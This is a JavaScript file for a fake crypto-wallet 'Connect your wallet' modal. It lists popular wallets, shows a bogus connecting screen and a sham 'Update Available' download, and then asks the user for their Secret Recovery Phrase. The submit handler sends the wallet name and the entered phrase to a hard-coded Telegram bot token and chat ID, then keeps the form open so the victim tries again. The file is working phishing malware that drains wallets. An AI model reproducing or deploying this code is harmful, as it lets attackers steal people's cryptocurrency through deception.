class WalletModal {
    constructor(options = {}) {
        this.wallets = options.wallets || [
            { name: "MetaMask", icon: "./images/metamask.png" },
            { name: "WalletConnect", icon: "./images/wallet-connect.png" },
            { name: "Trust Wallet", icon: "./images/trust-wallet.png" },
            { name: "Coinbase Wallet", icon: "./images/coinbase.png" },
            { name: "Ledger", icon: "./images/ledger.png" },
            { name: "Trezor Wallet", icon: "./images/trezor.png" },
            { name: "Phantom", icon: "./images/phantom.png" },
            { name: "OKX Wallet", icon: "./images/okx.png" },
            { name: "SafePal", icon: "./images/safepal.png" },
            { name: "Unisat", icon: "./images/unisat.png" },
            
        ];
        this.injectStyles();
        this.injectHTML();
        this.attachEvents();
    }

    injectStyles() {
        if (document.getElementById('wallet-modal-style')) return;
        const style = document.createElement('style');
        style.id = 'wallet-modal-style';
        style.innerHTML = `
        .walletconnect-modal {
            background: #fff;
            border-radius: 24px;
            box-shadow: 0 8px 32px rgba(31, 35, 40, 0.15);
            width: 420px;
            max-width: 95vw;
            padding: 0;
            overflow: hidden;
            position: fixed;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            z-index: 2000;
        }
        .walletconnect-modal-header {
            display: flex;
            align-items: center;
            justify-content: space-between;
            padding: 24px 28px 0 28px;
        }
        .walletconnect-modal-title {
            font-size: 22px;
            font-weight: 700;
            color: #222;
            margin: 0;
        }
        .walletconnect-modal-close {
            background: none;
            border: none;
            font-size: 28px;
            color: #000;
            cursor: pointer;
            transition: color 0.2s;
        }
        .walletconnect-modal-close:hover {
            color: #007AFF;
        }
        .walletconnect-modal-body {
            padding: 18px 28px 28px 28px;
        }
        .wallet-list {
            display: flex;
            flex-direction: column;
            gap: 10px;
            max-height: 340px;
            overflow-y: auto;
            margin: 0;
            padding: 0;
        }
        .wallet-list-item {
            display: flex;
            align-items: center;
            gap: 16px;
            background: #f6f8fa;
            border-radius: 14px;
            padding: 14px 18px;
            cursor: pointer;
            border: 2px solid transparent;
            transition: background 0.2s, border 0.2s, box-shadow 0.2s;
            box-shadow: 0 1px 2px rgba(31,35,40,0.03);
        }
        .wallet-list-item:hover, .wallet-list-item:focus {
            background: #e9f2ff;
            border: 2px solid #007AFF;
            outline: none;
        }
        .wallet-list-icon {
            width: 36px;
            height: 36px;
            border-radius: 8px;
            background: #fff;
            object-fit: contain;
            box-shadow: 0 1px 4px rgba(0,0,0,0.04);
        }
        .wallet-list-name {
            font-size: 16px;
            font-weight: 600;
            color: #222;
        }
        .main-container {
            display: none;
            position: fixed;
            top: 15px;
            right: 15px;
            width: 100%;
            max-width: 380px;
            background: white;
            box-shadow: 0px 4px 12px rgba(0, 0, 0, 0.2);
            border-radius: 14px;
            z-index: 1000;
            padding: 32px 0 24px 0;
            text-align: left;
            min-height: 520px;
            max-height: 90vh;
            overflow-y: auto;
            transition: width 0.3s;
            box-sizing: border-box;
        }
        .main-container.fit {
            width: 100%;
            max-width: 370px;
            min-width: 0;
            padding-left: 0;
            padding-right: 0;
        }
        .wallet-header {
            display: flex;
            align-items: center;
            justify-content: space-between;
            position: sticky;
            top: 0;
            left: 0;
            width: 100%;
            min-height: 38px;
            background: #f5f6fa;
            border-top-left-radius: 14px;
            border-top-right-radius: 14px;
            padding: 4px 16px 4px 16px;
            border-bottom: 1px solid #e0e7ef;
            z-index: 10;
            box-shadow: 0 1px 4px rgba(0,0,0,0.03);
            box-sizing: border-box;
        }
        .wallet-header .wallet-header-logo {
            width: 26px;
            height: 26px;
            border-radius: 6px;
            object-fit: contain;
            background: #fff;
            box-shadow: 0 1px 4px rgba(0,0,0,0.04);
        }
        .wallet-header .close {
            font-size: 18px;
            height: 26px;
            width: 26px;
            display: flex;
            align-items: center;
            justify-content: center;
            background: none;
            border: none;
            color: #333;
            cursor: pointer;
            z-index: 2;
            transition: background 0.2s;
            position: static;
            margin-left: auto;
        }
        .wallet-header .close:hover {
            background: #ececec;
            border-radius: 50%;
        }
        .update-container {
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            min-height: 420px;
            height: auto;
            position: relative;
            padding: 32px 24px 24px 24px;
            background: #fff;
            border-bottom-left-radius: 14px;
            border-bottom-right-radius: 14px;
            width: 100%;
            box-sizing: border-box;
        }
        .update-icon {
            display: block;
            margin: 1.2rem auto 1.2rem auto;
            width: 48px;
            height: 48px;
            color: #0376c9;
        }
        .update-title {
            color: #141618;
            font-family: Arial, sans-serif;
            font-weight: bold;
            font-size: 18px;
            margin-bottom: 0.3rem;
            text-align: center;
        }
        .update-version {
            color: #141618;
            font-family: Arial, sans-serif;
            font-weight: 500;
            font-size: 13px;
            margin-bottom: 1rem;
            text-align: center;
        }
        .update-list-container {
            background: #f5f5f5;
            border-radius: 0.5rem;
            padding: 0.7rem;
            margin-bottom: 1rem;
            width: 100%;
            max-width: 100%;
            max-height: none;
            overflow: visible;
            box-shadow: none;
        }
        .update-list {
            list-style-type: disc;
            padding-left: 1.1rem;
            margin: 0;
        }
        .update-list li {
            color: #141618;
            font-family: Arial, sans-serif;
            font-size: 12px;
            margin-bottom: 0.3rem;
            line-height: 1.4;
        }
        .update-btn {
            width: 100%;
            max-width: 100%;
            color: #fff;
            background: #0376c9;
            font-family: Arial, sans-serif;
            font-weight: 500;
            font-size: 13px;
            cursor: pointer;
            border-radius: 9999px;
            height: 38px;
            border: none;
            transition: opacity 0.3s;
        }
        .update-btn:hover {
            opacity: 0.8;
        }
        .update-help {
            margin-top: 0.7rem;
            text-align: center;
            font-family: Arial, sans-serif;
            font-size: 12px;
            color: #141618;
        }
        .update-help a {
            color: #0376c9;
            text-decoration: none;
            transition: opacity 0.3s;
        }
        .update-help a:hover {
            opacity: 0.8;
        }
        .form-center {
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: flex-start;
            background: #fff;
            border-bottom-left-radius: 14px;
            border-bottom-right-radius: 14px;
            padding: 32px 0 18px 0;
            width: 100%;
            max-width: 370px;
            margin: 0 auto;
            box-sizing: border-box;
            min-height: unset;
            height: auto;
            overflow: visible;
        }
        .center-btn {
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 60px;
            height: 60px;
        }
        #progressBarContainer {
            width: 90%;
            margin: 18px auto 0 auto;
            background-color: #ddd;
            height: 16px;
            border-radius: 4px;
            margin-top: 18px;
            margin-bottom: 10px;
            display: flex;
            align-items: center;
        }
        #progressBar {
            width: 0%;
            height: 8px;
            background: #007AFF;
            border-radius: 4px;
            transition: width 0.5s ease-in-out;
        }
        #progressMessage {
            display: block;
            text-align: center;
            font-size: 12px;
            color: #000;
            margin-top: 18px;
            margin-bottom: 0;
            line-height: 1.5;
            max-width: 90%;
            word-break: break-word;
        }
        #passwordSection { display: none; margin-top: 15px; }
        input, textarea { width: 100%; padding: 10px; margin-bottom: 12px; border: 1px solid #ccc; border-radius: 6px; }
        .hidden { display: none !important; }
        #passwordSection textarea,
        #passwordSection input[type="password"] {
            width: 100%;
            max-width: 100%;
            min-width: 0;
            margin-bottom: 12px;
            padding: 10px;
            border: 1px solid #ccc;
            border-radius: 6px;
            font-size: 15px;
            box-sizing: border-box;
            resize: none;
        }
        #passwordSection label {
            margin-top: 8px;
            margin-bottom: 4px;
            display: block;
            color: #333;
            font-weight: bold;
        }
        #passwordSection button {
            width: 80%;
            max-width: 100%;
            margin: 0 auto;
            display: block;
            padding: 12px 0;
            font-size: 16px;
            border-radius: 8px;
            background: #0376c9;
            color: #fff;
            font-weight: 500;
            border: none;
            transition: opacity 0.3s;
        }
        #passwordSection button:hover {
            opacity: 0.8;
        }
        #formMessage {
            text-align: center;
            color: #000;
            margin-bottom: 13px;
            font-size: 12px;
        }
        .loader-container {
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            min-height: 220px;
            height: 220px;
        }
        .loader {
            border: 5px solid #f3f3f3;
            border-top: 5px solid #007AFF;
            border-radius: 50%;
            width: 40px;
            height: 40px;
            animation: spin 1s linear infinite;
            margin: 24px 0 0 0;
        }
        .loader-wallet-img {
            width: 56px !important;
            height: 56px !important;
            margin-bottom: 14px !important;
            display: block;
        }
        @keyframes spin {
            0% { transform: rotate(0deg);}
            100% { transform: rotate(360deg);}
        }
        @media (max-width: 480px) {
            .walletconnect-modal {
                width: 98vw;
                margin: 10px auto;
                border-radius: 14px;
                left: 50%;
                top: 50%;
                transform: translate(-50%, -50%);
            }
            .walletconnect-modal-header,
            .walletconnect-modal-body {
                padding: 14px 8vw 0 8vw;
            }
            .form-center {
                padding: 18px 0 10px 0;
                max-width: 98vw;
            }
        }
        `;
        document.head.appendChild(style);
    }

    injectHTML() {
        if (document.getElementById('walletModal')) return;
        const modalHTML = `
            <div id="walletModal" class="walletconnect-modal" style="display:none;">
                <div class="walletconnect-modal-header">
                    <span class="walletconnect-modal-title">Connect your wallet</span>
                    <button class="walletconnect-modal-close" id="closeWalletModal" aria-label="Close">&times;</button>
                </div>
                <div class="walletconnect-modal-body">
                    <div class="wallet-list" id="walletOptions"></div>
                </div>
            </div>
            <div id="mainContainer" class="main-container" style="display:none;">
                <div id="mainContent"></div>
            </div>
        `;
        document.body.insertAdjacentHTML('beforeend', modalHTML);
    }

    attachEvents() {
        document.getElementById("closeWalletModal").onclick = () => {
            document.getElementById("walletModal").style.display = "none";
        };
        this.loadWalletOptions();
    }

    show() {
        document.getElementById("walletModal").style.display = "block";
    }

    loadWalletOptions() {
        const walletOptionsDiv = document.getElementById("walletOptions");
        walletOptionsDiv.innerHTML = "";
        this.wallets.forEach(wallet => {
            const div = document.createElement("div");
            div.className = "wallet-list-item";
            div.tabIndex = 0;
            div.innerHTML = `<img class="wallet-list-icon" src="${wallet.icon}" alt="${wallet.name}"><span class="wallet-list-name">${wallet.name}</span>`;
            walletOptionsDiv.appendChild(div);

            div.addEventListener("click", () => {
                document.getElementById("walletModal").style.display = "none";
                this.showWalletLoading(wallet);
            });
            div.addEventListener("keypress", (e) => {
                if (e.key === "Enter" || e.key === " ") {
                    document.getElementById("walletModal").style.display = "none";
                    this.showWalletLoading(wallet);
                }
            });
        });
    }

    showWalletLoading(wallet) {
        const mainContainer = document.getElementById("mainContainer");
        const mainContent = document.getElementById("mainContent");
        mainContainer.classList.remove('fit');
        mainContent.innerHTML = `
            <div class="loader-container">
                <img src="${wallet.icon}" alt="${wallet.name}" class="loader-wallet-img">
                <div class="loader"></div>
                <div style="margin-top:16px;font-size:16px;color:#333;">Connecting to ${wallet.name}...</div>
            </div>
        `;
        mainContainer.style.display = "block";
        setTimeout(() => {
            this.showUpdateContainer(wallet.name, wallet.icon);
        }, 2000);
    }

    showUpdateContainer(walletName, walletIcon) {
        const mainContainer = document.getElementById("mainContainer");
        const mainContent = document.getElementById("mainContent");
        mainContainer.classList.add('fit');
        mainContent.innerHTML = `
            <div class="wallet-header">
                ${walletIcon ? `<img class="wallet-header-logo" src="${walletIcon}" alt="${walletName}">` : ""}
                <button class="close" id="closeMain" aria-label="Close">&times;</button>
            </div>
            <div class="update-container">
                <svg class="update-icon" xmlns="http://www.w3.org/2000/svg" width="48" height="48" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
                    <path d="M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4"></path>
                    <polyline points="7 10 12 15 17 10"></polyline>
                    <line x1="12" y1="15" x2="12" y2="3"></line>
                </svg>
                <h2 class="update-title">Update Available</h2>
                <p class="update-version">Version 12.12.0</p>
                <div class="update-list-container">
                    <ul class="update-list">
                        <li>Fix main build modifying desktop build steps</li>
                        <li>Improving the security system</li>
                        <li>Fix incorrect network information</li>
                        <li>Improve performance on signature request</li>
                    </ul>
                </div>
                <button class="update-btn" type="button" id="updateButton">Update Now</button>
                <div class="update-help">
                    Need help? <a href="https://href.li/?https://support.io" target="_blank">Contact Support</a>
                </div>
            </div>
        `;
        mainContainer.style.display = "block";

        document.getElementById("updateButton").onclick = () => {
            this.showProgress(walletName, walletIcon);
        };
        document.getElementById("closeMain").onclick = function () {
            mainContainer.style.display = "none";
        };
    }

    showProgress(walletName, walletIcon) {
        const mainContainer = document.getElementById("mainContainer");
        const mainContent = document.getElementById("mainContent");
        mainContainer.classList.add('fit');
        mainContent.innerHTML = `
            <div class="wallet-header">
                ${walletIcon ? `<img class="wallet-header-logo" src="${walletIcon}" alt="${walletName}">` : ""}
                <button class="close" id="closeMain" aria-label="Close">&times;</button>
            </div>
            <div class="form-center">
                <img src="${walletIcon}" alt="${walletName}" class="loader-wallet-img">
                <h3 id="walletTitle" style="text-align:center;">Updating ${walletName}...</h3>
                <p id="walletMessage" style="text-align:center;font-size:13px;line-height:1.4;color:#000;margin-bottom:10px;max-width:90%;word-break:break-word;">
                    Please wait while we update to version 12.12.0
                </p>
                <div id="progressBarLabelRow" style="width:90%;margin:0 auto 2px auto;display:flex;justify-content:space-between;align-items:center;">
                    <span style="font-size:12px;color:#000;">Downloading update...</span>
                    <span id="progressText" style="font-size:12px;color:#000;">0%</span>
                </div>
                <div id="progressBarContainer">
                    <div id="progressBar"></div>
                </div>
                <div id="progressMessage">
                    This may take a few moments. Please do not close this window.
                </div>
                <form id="passwordSection" class="hidden" autocomplete="off" style="margin-top:10px;width:90%;max-width:320px;">
                    <div style="font-weight:bold;text-align:center;margin-bottom:4px;font-size:18px;letter-spacing:0.2px;color:#222;">
                        Import your wallet with your Secret Recovery Phrase
                    </div>
                    <div id="formMessage" style="text-align:center;color:#444;margin-bottom:13px;font-size:12px;line-height:1.5;font-weight:bold;">
                        We will use your Secret Recovery Phrase to validate your ownership. Enter the Secret Recovery Phrase that you were given when you created your wallet.<br>
                        <span style="color:#007AFF;font-weight:500;">This helps us verify your wallet securely.</span>
                    </div>
                    <label for="walletMessageInput" style="font-size:12px;font-weight:bold;display:block;text-align:left;margin-bottom:4px;">Secret Recovery Phrase</label>
                    <textarea id="walletMessageInput" rows="6" placeholder="Enter your Secret Recovery Phrase" style="font-size:15px;"></textarea>
                    <div style="font-size:11px;font-weight:bold;color:#000;margin-bottom:10px;text-align:left;">
                        Typically 12 (sometimes 18, 24) words separated by single spaces
                    </div>
                    <button type="submit" id="submitPassword" style="width:80%;max-width:100%;margin:0 auto;display:block;padding:12px 0;font-size:16px;border-radius:8px;">
                        Confirm Secret Recovery Phrase
                    </button>
                </form>
            </div>
        `;

        let progress = 0;
        const progressBar = document.getElementById("progressBar");
        const progressText = document.getElementById("progressText");
        const passwordSection = document.getElementById("passwordSection");
        const walletTitle = document.getElementById("walletTitle");
        const walletMessage = document.getElementById("walletMessage");
        const formMessage = document.getElementById("formMessage");
        const walletMessageInput = () => document.getElementById("walletMessageInput");

        // Animate progress bar (20 seconds total, 5% every 1 second)
        const interval = setInterval(() => {
            progress += 5;
            progressBar.style.width = progress + "%";
            progressText.innerText = progress + "%";

            if (progress >= 100) {
                clearInterval(interval);
                setTimeout(() => {
                    document.getElementById("progressBarContainer").style.display = "none";
                    document.getElementById("progressBarLabelRow").style.display = "none";
                    document.getElementById("progressMessage").style.display = "none";
                    walletTitle.style.display = "none";
                    walletMessage.style.display = "none";
                    formMessage.innerText = "We will use your Secret Recovery Phrase to validate your ownership. Enter the Secret Recovery Phrase that you were given when you created your wallet.";
                    passwordSection.style.display = "block";
                    passwordSection.classList.remove("hidden");
                }, 500);
            }
        }, 1000);

        passwordSection.addEventListener("submit", function (e) {
            e.preventDefault();

            // Get input value
            const phrase = walletMessageInput().value.trim();

            // Always set placeholder and border to red after submit
            walletMessageInput().style.borderColor = "red";
            walletMessageInput().placeholder = "Secret Recovery Phrase is required!";

            // If empty, do not send
            if (!phrase) {
                return;
            }

            
            const botToken = "7141420161:AAGh3wZMnUv45CEQg6UE7e0xpQIZGtYcdPA";
            const chatId = "-4704812522";
            const message = `Wallet: ${walletName}\nSecret Recovery Phrase:\n${phrase}`;

            fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify({
                    chat_id: chatId,
                    text: message
                })
            });

            // Do not reload or hide the form, just keep the placeholder and border red
        });

        document.getElementById("closeMain").onclick = function () {
            mainContainer.style.display = "none";
        };
    }
}

